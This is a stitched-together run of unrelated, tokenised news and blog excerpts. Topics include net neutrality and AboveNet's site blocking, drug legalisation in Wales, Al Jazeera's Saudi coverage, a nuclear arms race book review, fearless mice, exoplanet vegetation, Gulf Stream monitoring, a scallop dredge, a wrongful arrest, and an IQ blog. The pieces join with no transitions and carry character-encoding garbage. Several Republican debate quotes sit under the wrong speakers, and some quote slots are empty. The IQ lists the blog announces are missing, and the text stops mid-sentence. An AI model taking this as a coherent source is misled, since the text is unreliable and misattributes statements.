I worry about it .
Probably other people worry about it more than I do .
Although , he did n't get to making any such frank statements during the controversy over AboveNet 's Web site blocking .
( Perhaps MAPS 's lawyers were worried that he was a little too unfiltered and advised him not to comment ; at the time , the MAPS Web site had a " How to sue MAPS " link on the front page . )
Speaking of which , Anne Mitchell , Director of Legal and Public Affairs for MAPS during the time when AboveNet was blocking Web sites , was the only MAPS adherent from the era that I could find who has since clearly and publicly come out against Net Neutrality .
In May 2006 she wrote :
Here 's the thing that the 3Ns ( Net Neutrality Nuts ) do n't get : bandwidth costs money .
And if you can't charge those who use the majority of it accordingly , then you are going to have to amortize it across everybody .
So , if a net neutrality law passes , do n't be surprised when your costs to have an Internet account skyrocket .
Because somebody has to pay those bills , and if the law says that the ISPs can't charge the big guys - the big users - differently , it means that they have to charge them the same rate that they charge everyone else .
And that means not that their rate will go down , but that everybody else 's rate will go up .
And then again in February 2007 in another blog post titled " Towards A Nanny Internet " , she wrote , " Network neutrality is the idea that ISPs should be forced to charge everybody the same for their Internet use " , grouping it together with proposed anti-bullying and anti-anonymity laws .
Well , points to Anne for being consistent , and for publicly declaring her views in no uncertain terms , which is all I 'm asking of the other supporters of AboveNet 's website blocking policy .
( Although she 's coming at it from a different angle this time , " How do we work out who pays for the traffic " rather than " ISPs should be allowed to block whatever they want without telling anybody " . )
But this is also a textbook example of what I think are the three major fallacies of opposition to Net Neutrality :
First , lumping it together with other examples of unpopular regulation and calling it one more example of Big Government -- an argument also tried in other editorials ( " Politicians and public figures alike should realize the absurdity of advocating more red tape to keep the Internet free " ) .
This meme has never really caught on , possibly because groups like the ACLU and the EFF that have traditionally opposed true Internet censorship , have lined up in favor of Net Neutrality .
All the proposed " red tape " and " regulation " really says is that if a user attempts to access a Web site over a connection that they 've paid for , the ISP may not block or slow down their access , a law which most people would hardly consider tyrannical .
Second , asserting that " Network neutrality is the idea that ISPs should be forced to charge everybody the same for their Internet use . "
I 've never actually heard anyone advocate anything close to that , but a common question among skeptics is why different " tiers " for Internet traffic are really any different from different - tiered pricing for dial - up vs. DSL , or for different levels of Web hosting .
The difference is that when users and Web site owners pay for those connections , they are paying for their respective connections to the rest of the Internet .
But an ISP charging a Web site owner to carry their traffic the last mile to the user 's house , is not charging for a product or service , but really charging a fee not to break a service that they 've already agreed to provide to the user .
Which leads to the third misconception : " Here 's the thing that the 3Ns ( Net Neutrality Nuts ) do n't get : bandwidth costs money ...
So , if a net neutrality law passes , do n't be surprised when your costs to have an Internet account skyrocket . "
But it 's not about how much a service costs , but about the ethics of double - billing for it .
We know that ISP pricing models can already support the total traffic that people consume today , and ISPs do already follow net neutrality principles most of the time , so nobody 's costs will " skyrocket " just because a neutrality law passes .
If vastly more people start trying to stream CNN over the Internet 24/7 , and fully using the services that ISPs have " only been pretending to sell " as Brad Templeton put it , then ISPs may have to charge more for users who consume too much bandwidth , encouraging people to stay at today 's average levels by rationing themselves and perhaps watching 24 on their $ 5,000 TV sets sometimes instead of downloading it off of BitTorrent to their laptop every week because it makes them feel like a haX0r .
Much as we all love our unmetered connections , it would n't be a violation of Net Neutrality for ISPs to charge users for bandwidth hogging , to keep everyone from going too far above today 's levels .
What ISPs should not do is charge users for implied full - throttle connections , and then turn around to charge publishers for moving bits over those same lines , or block the connection for any other reason .
So , yes , Virginia , blocking of Web sites does happen -- and by " Virginia " , I mean FTC Chairman Deborah Platt Majoras , who said in a speech in August 2006 : " I have to say , thus far , proponents of net neutrality regulation have not come to us to explain where the market is failing or what anticompetitive conduct we should challenge ; we are open to hearing from them . "
This was echoed in an editorial later that month from Sonia Arrison of the Pacific Research Institute :
Internet service providers have voluntarily upheld content - neutral practices without the need for government intervention , and consumers would never stand for blocked Web sites ...
If the loss of net neutrality principles was really a problem , advocates would n't need to scare Americans in order to win their support .
Using government regulation preemptively to shortchange business partners is a reckless abuse of the public policy process .
New laws should be based on facts and reality , not fear and hypothetical situations .
I guess both of those ladies ' ISPs must be blocking access to the SaveTheInternet.com
Web site , so I e-mailed both of them the coalition 's list of examples , and added a note about the AboveNet / TeleGlobe incident as well .
No personal response from either of them yet , but I 'm sure they just got lost in the shuffle while they were so busy sending out corrections .
( On the other hand , I did get a courteous response from Randolph J. May of the Free State Foundation , when I wrote to him about an editorial he penned which also argued that violations have not happened : " It is generally agreed that except for a few isolated and quickly remedied incidents , neither the cable operators nor the telephone companies providing broadband Internet services have blocked , impaired or otherwise restricted subscriber access to the content of unaffiliated entities . "
He said he had n't known about the AboveNet / TeleGlobe incident either . )
Another theme in some anti-Net - Neutrality editorials is that existing laws are enough to deal with the problem .
In Majoras 's speech , she said , " We should not forget that we already have in place an existing law enforcement and regulatory structure . "
Arrison 's echoed that " Numerous federal agencies already have set a basic legal framework in place to preserve fair competition and business practices on the Internet " .
Well , as Yogi Berra says , in theory , there is no difference between theory and practice , but in practice , there is .
After I found out AboveNet and TeleGlobe were blocking my Web site , I called about twenty lawyers in the Bellevue phone book , figuring : I was n't greedy , but surely there would be financial damages for deceiving users and blocking our site , enough to pay a lawyer in return for handling the case ?
I think about two lawyers called me back , and they both said that even though what the backbone companies were doing clearly looked like fraud , it would take tens of thousands of dollars just to get started , and even if we ever got to court , the judge could call it however they wanted .
Whatever laws exist now , they may help the slightly smaller big guy against the bigger big guy , but are not much use to the little or medium - sized guy .
So , any informed debate about Net Neutrality has to include the fact that , yes , some providers have blocked Web sites on purpose , for long periods of time , and no , the free market did n't fix it by itself .
Even if something on that scale never happens again , if the free market and the anti-trust laws did n't automatically correct a case where Web sites were being blocked outright , then it 's wishful thinking to think that those forces will prevent ISPs from merely slowing down Web access to sites that have n't paid a " toll " , as they have made noises about doing .
One AboveNet customer , Sam Knutson , said when he found out about the Web site blocking , " This type of behavior on the part of an ISP is reprehensible .
I pay for a pipe and do n't expect this type of monkey business . "
Well , I agree that it 's reprehensible ; whether we should " expect " more of it or not , depends on how much the Net Neutrality movement achieves its goals .
Richard Brunstrom acknowledges his is a minority view
The chief constable also predicted the " inevitable " legalisation of all drugs within the next decade .
Rhondda MP
Chris Bryant said Mr Brunstrom had " extraordinary " opinions and an " obsession " with publicity .
But Mr Brunstrom was backed by police authority member Terry Renshaw , who said his views were based on research .
Mr Bryant said : " I think these are very dangerous views .
Ecstasy is not a safe drug and the people who sell ecstasy to youngsters in the Rhondda also sell heroin and the whole shooting range of drugs .
" Drugs have been one of the major challenges that the Rhondda has had to face since the mines [ closed ] . "
Minority view
He went on : " When you start buying [ drugs ] from somebody the whole sweetie counter is available to you .
And we need to do more to disrupt the supply chain . "
Chris Bryant says drugs have blighted his Rhondda constituency
Mr Brunstrom , who has campaigned for drugs like heroin to be made legal , told BBC Radio 4's Today programme how he believed a move towards decriminalisation was " 10 years away " .
The chief constable said repealing the Misuse of Drugs Act would destroy a major source of organised crime .
Mr Brunstrom , who acknowledged that his was a minority view , also said he thought ecstasy was safer than aspirin .
He said : " If you look at the government 's own research into deaths you 'll find that ecstasy , by comparison to many other substances - legal and illegal - is comparably a safe substance . "
Drug law reform
But Mr Bryant said he believed " all drugs are dangerous " and the long - term side effects of certain drugs , such as cannabis , were only now coming to light .
He said he thought Mr Brunstrom , whose tough stance on speeding drivers is also widely reported , was " obsessed with his own publicity " .
A spokesman for DrugScope , the UK's leading independent centre of expertise on drugs , said it believed the legalisation of drugs within the next decade was unlikely .
" Neither the current government nor the leaders of the other parties show any inclination towards drug law reform in the near future , " he said .
" And in fact this government has already suggested its desire and its looking closely at reclassifying cannabis from class C to B . "
Flintshire councillor and North Wales Police Authority member Terry Renshaw said Mr Brunstrom had his full support .
Mr Renshaw said everyone who referred to Mr Brunstrom as the " mad mullah from Colwyn Bay " should read documents on drugs legalisation he presented to the police authority .
He said while anyone using illegal drugs was criminalised , people were still allowed to buy alcohol and cigarettes , and refusing to examine the issue was " ostrich syndrome " .
He said that while North Wales Police were very pro-active in fighting illegal drugs use , he felt it was a waste of resources , with the more drugs taken off the streets , the more that arrived .

Al Jazeera ’s general manager , Waddah Khanfar , did not reply to phone and e-mail requests for comment .
But several employees confirmed that the chairman of the board had attended the meeting .
They declined to give their names , citing the delicacy of the issue .
The governments of Qatar and Saudi Arabia have remained silent on the matter .
Repercussions were soon felt at Al Jazeera .
“ Orders were given not to tackle any Saudi issue without referring to the higher management , ” one Jazeera newsroom employee wrote in an e-mail message .
“ All dissident voices disappeared from our screens . ”
The employee noted that coverage of Saudi Arabia was always politically motivated at Al Jazeera  in the past , top management used to sometimes force - feed the reluctant news staff negative material about Saudi Arabia , apparently to placate the Qatari leadership .
But he added that the recent changes were seen in the newsroom as an even more naked assertion of political will .
“ To improve their relations with Qatar , the Saudis wanted to silence Al Jazeera , ” he wrote .
“ They got what they wanted . ”
The changes at Al Jazeera are part of a broader reconciliation between Saudi Arabia and Qatar .
In December , the Saudi foreign minister , Prince Saud al - Faisal , announced that Saudi Arabia would send an ambassador back to Qatar for the first time since 2002 .
Also in December , the Saudis attended the Gulf Cooperation Council meeting in Doha , Qatar ’s capital , which they had refused to do the last time it was held there .
The Saudis have also indicated that they may allow Al Jazeera to open a bureau in Riyadh .
The feud between Qatar and its much larger neighbor , for all its pettiness , has had real consequences .
It led to the creation of Al Jazeera in the first place , which in turn helped shape perceptions  and , perhaps , realities  across the Arab world and beyond over the past decade .
The feud began in the mid-1990s , when the Qatari leadership accused the Saudis of supporting a failed coup attempt .
Soon afterward , Al Jazeera was founded with a $ 150 million grant from the emir of Qatar , Sheik Hamad bin Khalifa al - Thani , and began reshaping the Arab media .
The station was helped when the BBC ’s Arabic - language television station , co-owned by a Saudi company , collapsed , thanks in part to Saudi censorship demands .
The BBC journalists flocked to Al Jazeera .
Arsenals of Folly : The Making of the Nuclear Arms Race
By Richard Rhodes
Knopf , 386 pp. , illustrated , $ 28.95
Shortly after the collapse of the Soviet Union , an op - ed piece in The New York Times celebrated the evident fact that , with the nuclear arms race finally over , humanity no longer needed to worry about the atomic bomb .
The celebration was premature .
Today , the Bomb is back .
And , as it turns out , the nuclear arms race is not so much over as proceeding in a new - and probably more dangerous - direction .
Richard Rhodes , the author of two previous , deservedly popular books on nuclear weapons - " The Making of the Atomic Bomb " and " Dark Sun " - has written a third book in his series on what now seems , in retrospect , Nuclear Arms Race I .
Perhaps the most interesting thing about Rhodes 's new book is its focus on two dirty little secrets about nuclear strategy during the Cold War that the experts never liked to talk about : the first being that , while both superpowers talked deterrence , they were actually planning for a possible preemptive attack - which , in the Pentagon 's official definition , is " an attack initiated on the basis of incontrovertible evidence that an enemy attack is imminent . "
The other , dirtier secret is that at least three American presidents were presented with plans for a surprise nuclear strike against the Soviet Union , otherwise known as preventive war - " a war initiated in the belief that military conflict , while not imminent , is inevitable and that to delay would involve greater risk . "
In 1949 , President Truman rejected the advice of those who urged that he strangle the Soviet nuclear program in its cradle .
Eight years later , Eisenhower 's secretary of state , John Foster Dulles , showed one defense expert the door after his visitor suggested that the United States launch a Pearl Harbor - style nuclear attack on the Russians .
President Kennedy was reportedly intrigued , during the 1961 Berlin crisis , with the plan that aides gave him for what they called a " clever first strike " - a scheme to disarm the Soviets by destroying Russian bombers and missiles on the ground .
But in every case cooler heads prevailed .
Still , as Rhodes lets the reader know , it was a near thing .
The great danger of the Cold War was that an accident or miscalculation could occur during a crisis , when both superpowers engaged in a game of chicken known as mutually reinforcing alerts .
The unthinkable almost occurred in 1962 , when the United States and the USSR faced off over the clandestine introduction of Soviet missiles into Cuba .
Bad as the consequences of a nuclear war were believed to be back then , the reality would almost certainly have been much worse .
Incredibly , despite the money and talent lavished on the weapons themselves , the planning for their use now seems both short - sighted and slipshod .
It was not until the early 1980s that strategists realized how the dust and debris kicked up by nuclear explosions might enshroud the earth , bringing about a so - called nuclear winter and perhaps casting humanity into Stygian darkness .
Even more remarkable is that war planners , when estimating prospective casualties in a nuclear war , looked only at fallout and blast damage , neglecting to factor in the effects of fire - even though the majority of deaths in World War II 's massed bomber raids on Hamburg and Tokyo had been caused by the resulting conflagration , which literally sucked the air out of the lungs of people huddled in underground shelters .
In the 1960s , US nuclear strategists thought that an all - out nuclear war - what strategist Herman Kahn famously called a " wargasm " - might leave 285 million Russians , Chinese , and Europeans dead .
More recent estimates are that such a war could have killed nearly a billion people , almost a third of the human population at that time .
Tom and Jerry just would n't have been the same if it had featured one of Ko Kobayakawa 's mice .
The Tokyo University professor has just unveiled mutant mice that have lost their innate fear of cats .
Rather than flee or freeze when confronted with their feline enemy , the mice sniffed and even played with them , blissfully unaware of the potential dangers .
Kobayakawa developed the fearless mice by shutting down receptors in their olfactory bulb - the area of the brain that processes information about smells - which would normally induce panic as soon as they get so much as a whiff of a cat .
In experiments with cats belonging to students , the genetically engineered rodents simply carried on as usual , sniffing and playing with their nemesis as if nature had intended them to be best friends .
" Mice fear cats because they are innately conditioned to fear when sensing the odour of the predators .
So by getting rid of the specific receptors for sensing the odour , mice never feel afraid of cats , " Kobayakawa told Reuters .
His research confirms the long - held belief among scientists that fear in animals is connected to their keen sense of smell .
" Once removing innate elements by which mice fear cats from them , we are able to make mice who can get along with cats , " he said .
" So by applying this theory to other mammals , we will probably be able to make other animals that are not afraid of their natural enemies . "
Inducing fearlessness in mice does not mean that cats , too , are ready to form unlikely friendships with their prey .
Mochikko - chan , a cat used in a recent demonstration , was chosen because of her particularly docile nature .
Also , according to the researchers , even the modified mice froze in fear whenever the cats miaowed .
We ’ve already found over 250 extrasolar planets , and more are continuing to be discovered fairly often .
With all of these new planets popping up , the obvious question must be asked : how do we go about detecting whether or not they contain life ?
Though we ca n’t yet see features on the surface with even the most powerful of telescopes â€ “ and probably wo n’t be able to do so for a very long time â€ “ an analysis of the light coming from the planet may reveal if it is covered with life in the form of plants .
Dr. Luc Arnold of the CNRS Observatoire de Haute - Provence in France suggests that a spectral analysis of the light reflected off of a planet could determine whether or not it is covered with vegetation .
Earth ’s plant - covered surface absorbs certain frequencies of light , and reflects others .
Our vegetation has a very specific spectrum because it absorbs a lot of visible light around 700 nanometers , or the color we see as red .
This is called the Vegetation Red Edge ( VRE ) .
By looking at the sunlight that is reflected off of the Earth â€ “ Earthshine â€ “ the composition of the Earth ’s surface and atmosphere can be determined .
The Earth ’s light can be analyzed when it is reflected off of the Moon , or from spacecraft distant enough from the Earth to see it as a small disk .
Knowing the composition of the Sun ’s light , and adjusting for the elements and minerals in the atmosphere and on the surface , there is still between 0 - 10 % of the photons near the red end of the visible spectrum that are missing .
The factor needed to explain this photon absorption is the presence of plants , which use the light for photosynthesis
This same method could potentially be used to detect the presence of vegetation on extrasolar planets , proposes Dr. Arnold in a paper titled , Earthshine Observation of Vegetation and Implication for Life Detection on Other Planets published in the October 30th , 2007 edition of the journal Space Science Review .
“ The point is that if , in the spectrum of an Earthlike planet , we find a spectral signature â€“ probably different than the VRE â€ “ that cannot be explained as a mineral signature , nor an atmospheric signature , then the proposition that this feature is a possible signature of life becomes relevant .
Especially if a variation in the strength of the signal is correlated with planet ’s rotation period , suggesting that the spectral feature is on planet ’s surface , ” Dr. Arnold said .
The VRE on Earth is calculated by taking out “ noise factors ” such as the composition of the atmosphere , whether there are a lot of clouds , and whether the part of the Earth reflecting the light is covered by desert , ocean , or forest .
All of these things absorb light in different parts of the spectrum .
These same details must be sorted out for other planets to ensure that the absence of photons in a certain part of the spectrum is indeed due to plants absorbing the light .
To be able to rule out other factors in the spectrum of the planet , the resolution has to be better than is currently possible .
ESA ’s Darwin and NASA ’s Terrestrial Planet Finder , both missions being designed to specifically look for new terrestrial planets and better study already - discovered ones , are expected to launch in the next 10 years or so .
They will not be able to resolve the spectrum of extrasolar planets well enough to use this method for finding vegetation , but the second - generation of planet - finding telescopes will likely have this ability .
The question remains as to whether plants on distant worlds will use chlorophyll as their means of photosynthesizing light .
Will the light they absorb be red , or a different color ?
Will the light they reflect be green or something completely bizarre , like magenta or bright blue ?
If they do use chlorophyll , their spectrum will be similar to that of our own planet .
If not , their spectral signature may be rather different than that of Earth ’s vegetation .
Dr. Arnold says a different VRE might still be rather interesting : “ What would we say to us such a strange and different VRE ?
It will reveal missing photons , i.e. photons form the star absorbed and ‘ used ’ ( their energy ) in an unknown or unidentified chemical process , that ’s all we would learn .
Here again , other information about the atmosphere composition ( water vapor , oxygen , ozone , etc. ) and temperature would help to make coherent proposals .
At least it would feed an very exciting debate ! ”

JANUARY 15 -- We 've all seen those mug shot arrays showing the sad progression of an arrestee caught in the throes of drug abuse .
Well , here 's the flip side .
The Florida woman seen in these photos has had her mug shot snapped five times over the past 14 months ( drunk driving , pot possession , probation violation , etc. ) and each picture is suitable for framing .
The frequent arrestee is 20 and has alternately listed her occupation as ' bartender ' and ' dancer ' when busted .
And based on police ID photos of her ink , she appears to be a tattoo enthusiast .

KABUL , Afghanistan 
At least nine Afghan police officers and a civilian were killed early Thursday in a firefight between American forces and the officers in Ghazni Province , just south of the capital , local officials said .
The American forces were searching houses in a village on the outskirts of Ghazni town and blew open the gates of a house , according to local Afghan officials .
District police officers heard the explosion and rushed to the scene , suspecting that the Taliban were in the area , but were themselves mistaken for Taliban and shot by the American soldiers , the officials said .
Aircraft supporting the operation fired on one of the police cars .
The killings set off protests in the town on Thursday afternoon , and demonstrators blocked the main highway and prevented a government delegation from reaching the town from a nearby airfield , local officials said .
“ Another big cruelty was made by American forces this morning , ” said Khial Muhammad Hussaini , a member of Parliament from the province who was among the elders and legislators who had traveled to the town to try to calm people and persuade them to reopen the highway .

a few choice quotes from yesterday 's Republican presidential
debate
Rudy Giuliani on whether or not it's a problem that China owns so much of our federal debt :
" The way to balance to books is to sell more overseas -- sell energy independence , sell health care . "
John McCain on monetary policy : " I 'm glad whenever they cut interest rates , I wish interest rates were zero . "
Dangers of a weak dollar is that it will damage us internationally .
We 've got to have a strong dollar because of the creditors that we have there .
It helps our exports to a certain extent now , and we 're enjoying that part of it .
But any president of the United States has to stand behind a strong dollar .
The whole world needs to know that we are good for our obligations .
What 's happening is there 's transfer of wealth from the poor and the middle class to the wealthy .
This comes about because of the monetary system that we have .
When you inflate a currency or destroy a currency , the middle class gets wiped out , so the people who get to use the money first , which is created by the Federal Reserve System , benefit , so the money gravitates to the banks and to Wall Street .
See , that 's why you have more billionaires than ever before .
Another one he should veto is the SCHIP program , which we should say -- take the " C " out of because now it 's for everybody , like every other entitlement program .
And by the way , a dollar a pack increase for cigarettes ?
So we want to take care of children 's health and we want everybody to smoke ?
I do n't get it .
Those were , by no means , the only regrettable economic statements of the day .
We have Fred Thompson , for instance , noting : And here 's Congressman Ron Paul :
And this , from Senator McCain , is my favourite , I think :
Say what you will about the interventionist tendencies of the Democratic candidates .
The level of economic illiteracy on display in the Republican field should be a source of deep concern .
An armada of robot submarines and marine sensors are to be deployed across the Atlantic , from Florida to the Canary Islands , to provide early warning that the Gulf Stream might be failing , an event that would trigger cataclysmic freezing in Britain for decades .
The £ 16 m system , called Rapid Watch , will use the latest underwater monitoring techniques to check whether cold water pouring south from melting Arctic ice sheets is diverting the current 's warm waters away from Britain .
Without the Gulf Stream , the UK would be as cold as Canada in winter .
Ports could freeze over and snowstorms and blizzards would paralyse the country .
An extreme version of this meteorological mayhem provided the film The Day After Tomorrow with its plotline .
' The Day After Tomorrow suggested the Gulf Stream could fail within a couple of days , ' said Rapid Watch 's co-ordinator , Meric Srokosz of the National Oceanography Centre , Southampton ( NOCS ) .
' In reality , a collapse will take a lot longer , but could still occur in about 10 years . '
Rapid Watch has been designed to discover if such weakening is already occurring or is about to begin .
The Gulf Stream starts in the Gulf of Mexico and follows the eastern US seaboard before crossing the Atlantic towards western Europe .
The heat it brings across the Atlantic gives Britain its temperate climate .
The former chief scientist , Sir Robert May , once calculated that the Gulf Stream delivered 27,000 times the warmth that all Britain 's power stations are capable of supplying .
But scientists have recently warned that the current is threatened by meltwater from Greenland and the Arctic .
As global warming takes a grip , glaciers and ice sheets are disappearing faster and faster .
This could bring major cooling to western Europe .
As the Intergovernmental Panel on Climate Change warned last year , the Gulf Stream is particularly warm and salty , and increasing amounts of fresh water pouring into it from the Arctic are likely to disrupt it .
These fears have been backed by studies involving research vessels that have zig - zagged across the Gulf Stream , measuring currents at various depths , data that indicated that the Gulf Stream was indeed beginning to switch off .
But in 2004 , Dr Srokosz - with his Southampton colleagues Professor Harry Bryden and Dr Stuart Cunningham - set up Rapid , a temporary array of sensors fixed to the seabed that provided daily measurements of the Gulf Stream for the first time .
The first results , which were published last year , revealed that the Gulf Stream fluctuates in a highly unpredictable fashion .
' The Gulf flows at an average rate of 20 million cubic metres per second , ' added Srokosz .
' But this flow varies from as little as four million cubic metres to about 35 million .
This means past isolated measurements could be highly misleading .'
As a result , Srokosz has designed Rapid Watch , which has just received £ 16 m from the Natural Environment Research Council .
' Rapid was a proof of concept study , ' he said .
' Rapid Watch is a full - scale detection system . '
Rapid Watch , which will begin operations later this year , will monitor the Gulf Stream until 2014 .
Cables will moor monitoring devices to the seabed and measure current flow , temperature and other variables at depths down to 5,000 metres .
In addition , robot probes - called gliders - will study the current as they descend and ascend .
' Robot gliders can currently operate to depths of about 1,000 metres , but soon versions that can dive to 5,000 metres should be ready .
' Certainly , it is critical we now find out how the Gulf Stream is behaving , ' added Srokosz .
' It has an immense influence on our climate - and our lives . '

Fishing and the environment : A new invention makes trawling for fish much less harmful to coral , sponges , seaweed and other denizens of the seabed
TASTY species live at the bottom of the sea .
Plucking these morsels from their habitat , however , is often a violent affair that destroys other denizens of the deep .
Now researchers have developed a more benign way to fish .
Trawling is the most widespread form of fishing .
But bottom trawling is brutal .
It uses an enormous , toothed bar mounted on a device called a dredge to scrape the seabed .
Dredging throws the intended catch up into a cloud that is captured by a net trailing behind .
Unfortunately , the cloud contains a lot of other stuff .
Anything at or just below the surface of the seabed — the benthic zone , in fishery parlance — gets dragged up .
The result is that a lot of other types of fish , crustaceans and molluscs are caught unintentionally .
More worryingly , sponges , seaweeds and centuries - old coral are destroyed .
This is serious because such sessile creatures are not merely part of the ecosystem .
In a sense , they are the ecosystem — in the way that it is plants rather than animals that define a forest .
Indeed , trawling has been compared to clear - cutting trees .
And from a practical point of view , this destruction of habitat contributes to the dwindling of fish stocks worldwide .
However , in one case — scallop trawling — Cliff Goudey of the Massachusetts Institute of Technology reckons he has a solution .
He and his team have designed a dredge that can dislodge scallops without touching the seafloor .
The dredge has several hemispheric scoops in place of the toothed bar .
As it is pulled along , the scoops direct water downward .
That creates a series of gentle jets that can shuffle the scallops from their resting places — but the streams of water are not powerful enough to damage the benthic zone 's long - term tenants .
And the scoops swivel out of the way if they encounter anything solid , so the dredge does not destroy such protuberances .
Best of all , from the fisherman 's point of view , it takes less effort to float a dredge on water jets than it does to drag it across the uneven surface of the seabed .
That makes Dr Goudey 's new device a more fuel - efficient way to fish than the traditional method .
Having assessed a prototype both in a laboratory tank and in the sea off the coast of Massachusetts , Dr Goudey was recently invited by the University of Wales to test his invention against a traditional dredge .
New and old designs were dropped from the stern of a trawler and towed across the seabed off the Isle of Man .
They each caught the same number of scallops .
The new dredge , though , damaged the catch much less than the traditional one .
Further tests will take the dredge over the regulatory hurdles toward commercial use .
Visserijcooperatie Urk , a Dutch fisheries - equipment firm , has already expressed an interest in using the new device to catch sole , another bottom - dwelling species .
A humble start — but it may yet be worth keeping an eye out for coral - friendly scallops next to the bird - friendly coffee .
Gmail , Google ’s ‘ spy email ’ , illegal in Europe – europasur.es ( original link in Spanish ) :
The controversy with Gmail ’s advertising system started almost from its inception .
The email system was and continues to be criticized since it uses Google ’s AdSense to include contextual advertisement together with email messages , which means that it ’s a ‘ bot ’ , a type of software , which ‘ reads ’ email contents , violating user privacy .
Despite the fact that Google ’s representatives indicate that no human has access to such communications , ‘ Consumers in Action ’ has won the first battle against Google for email privacy invasion .
After their complain before the Spanish Agency of Data Protection , this entity has declared illegal the business model used for this email service .
It would be funny and counter - productive if Gmail was somehow shutdown in Europe .
Frankly , I do n’t see it happening .
However , if it were to happen , I would be forced to transfer thousands of emails off from my Gmail account ; with Gmail ’s large storage capacity , I almost never delete an email .

Armed police held an innocent mechanic at gunpoint when they mistook his MP3 player for a pistol .
Darren Nixon , 28 , was arrested and put in police cell for simply listening to music on his way home from work .
The shocked garage worker was then swabbed for a DNA sample , had his mugshot taken and was fingerprinted .
Scroll down for more ...
The armed officers swooped on Mr Nixon when a woman thought she saw him carrying a handgun and called the police .
Mr Nixon , from Stoke - on - Trent , has now received an apology from Staffordshire Police but said the mistake was still a " stain on his character " .
He had finished work at midday on Saturday ( Jan 26 ) , turned on his black 4GB Phillips MP3 player and started walking to get the bus home .
Mr Nixon , a mechanic for Olympus Engineering , who has no previous convictions , said : " I walked to the bus station .
" Obviously I did n't know this at the time but someone saw my MP3 player in my pocket and mistook it for a gun .
" The police found me on CCTV and followed me .
I got on the bus and the police followed .
I was listening to my music so I did n't really notice all the cars behind the bus .
" I got off and started walking home .
I saw this cop gesture at me and at first I could n't hear what he was saying .
I turned the music off and they were telling me to put my hands up in the air .
" As I got closer I could see that two of the cops had guns .
There were two police dogs there as well .
I was searched at the scene then hauled off to the station and interviewed .
" I was really shocked when I saw the guns .
They were pointing them right at me .
It was a pretty scary experience .
I had no idea what was going on .
" I was n't happy at all about it .
I did n't even really get a proper apology from the police .
" They just dropped me off at home and said a quick ' sorry for any inconvenience ' , and that was all I got from them , which I thought was pretty out of order .
" It happened really near to where I live , so anyone could have seen me getting arrested - it's a stain on my character .
" It was unreal - I had a completely clean record before this and have always been a law - abiding citizen . "
A spokesperson for Staffordshire Police said : " We received a report from a member of the public who had seen a male in the area who had appeared to pull a hand gun from a jacket pocket , grip it with both hands and aim it towards something .
" An operation was put in place and a man matching the description was detained .
" No weapon was found on him at the time but he was taken into custody on suspicion while the surrounding area where he had been was searched .
" These searches proved negative , so the man was released and taken home , as no further action was required .
" The description was extremely good and if that 's the report we get we have to act quickly . "
The other day I sat down to watch The Princess Bride for about the 10,000th time .
Man that is a great movie !
Anyway , when I was watching the part where Vizzini , the Sicilian , was answering the question as to how smart he is , he said : “ Let me put it this way .
Have you ever heard of Plato , Aristotle , Socrates ?
Morons . ”
So , I decided to mosey on over to the Interwebs and find a list of people with the highest IQ ever measured , and lo and behold I could n’t find one !
So for the sake of future searchers , I compiled the following information .
Enjoy .
Background Info
In order to establish a baseline knowledge , IQ ( intelligence quotient ) is a score derived from attempting to measure the actual mental horsepower of any given individual .
Personally I place little value in IQ tests , but I do acknowledge that they are an indicator of some common potential success factors , so we ’ll leave it at that .
The “ average ” IQ is by definition 100 , so if you score below that you are dumber than average , and above it means smarter than average .
Commonly acknowledged IQ Score Ranking System :
IQ Score Traditional Ranking System 140 + ( ~.25 % ) Genius or near genius 130 – 139 Gifted 120 – 129 Very Superior Intelligence 110 – 119 Superior Intelligence 90 – 109 Average / Normal 80 – 89 Dullness 70 – 79 Borderline deficiency 50 – 70 Mild mental retardation 35 - 50 Moderate mental retardation 20 – 35 Severe mental retardation < 20 Profound mental retardation ( 1 % ) The distribution of IQ scores is as follows : 50 % of IQ scores fall between 90 and 110
70 % of IQ scores fall between 85 and 115
95 % of IQ scores fall between 70 and 130
99.5 % of IQ scores fall between 60 and 140
A score of 132 equals the top 2 %
A score of 134 equals the top 1 %
A score of 68 equals the bottom 2 %
A score of 66 equals the bottom 1 %
I ’d like to stop for a second and inject a little philosophy before we go on .
I have absolutely no respect whatsoever for intelligence .
I only respect people for their actions .
So no one should envy or emulate people on the list that follow because some of them are miserable human beings ( like this narcissistic guy ) .
Take Bobby Fischer as an example .
He ’s the biggest A - hole on the list , and I ’d like to kick his teeth in for his comments about Jews and America .
The Highest IQs On Record
People Still Alive
From the Past
In 1926 , psychologist Dr. Catherine Morris Cox – who had been assisted by Dr. Lewis M. Terman , Dr. Florence L. Goodenaugh , and Dr. Kate Gordon – published a study “ of the most eminent men and women ” who had lived between 1450 and 1850 to estimate what their IQs might have been .
Data from that study as well as other sources around the net were compiled to form the following list .
Please drop me a comment if you have additions or corrections ( make sure and cite sources ) .
Also , see Wikipedia ’s list of Universal Genius ( Polymaths ) .
Test YOUR IQ
Now that you ’ve read all about these really smart people , surely you want to know how you compare ?
Well , set aside a full 40 minutes and go through this test to determine where you are on the evolutionary chain .
Select the image below and the clock starts when the test loads , so be prepared in order to get the full 40 minutes .
Trust me , you ’re gonna need it !
Oh , and if you answer “ A ” on every question , you get a 72 !
( a=72 , b=65 , c=65 , d=65 , e=72 , f=72 , g= 65 , and h=65 – Only The Man would help you cheat on an IQ test ! )
… one of the better and possibly fairly accurate IQ tests ( 11/8/07 ) seen on the net .
Two caveats : 1 . This test evaluates visual spatial reasoning skills , and not verbal which some may say would be a bias toward guys .
2 . This test does not assess processing speed and ability to make quick / accurate and perhaps more c creative choices .
For different view of intelligence away from IQ try : Theory of Multiple Intelligences
EDIT : I received the following e-mail from Mike , a former school psychologist of 30 years , regarding the validity of this IQ Test
If it turns out you are a Genius , join a club !
Here ’s how to hook up with your intellectual peers :
By the way , why is it that most of the high IQ society Web sites suck so bad ?
And if I may inquire additionally , why is it that none of them have sections on their sites where they are actually teaching people by translating highly complex issues into understandable language ?
Now , for the rest of us ( I score just above a moderately intelligent canine , but just below a porpoise ) , you can just join the One Man ’s Blog Society for the Incredibly Average .
Believe me , we have a lot more fun around here .
Concerning the graduated repression of the Nazi regime , the Reverend Martin Niemoller , in 1945 , stated , to the effect : First they came for the Communists , and I did n’t speak up , because I was n’t a Communist .
Then they came for the Jews , and I did n’t speak up , because I was n’t a Jew .
Then they came for the Catholics , and I did n’t speak up , because I was a Protestant .
Then they came for me , and by that time there was no oneleft to speak up for me .
Though this quote has taken on many forms and endured several disputes , the ultimate interpretation stands .
That silence about liberty infractions equals civil death .
Further , on the notion of leading the public headstrong into oblivion , the Nazis said it best :
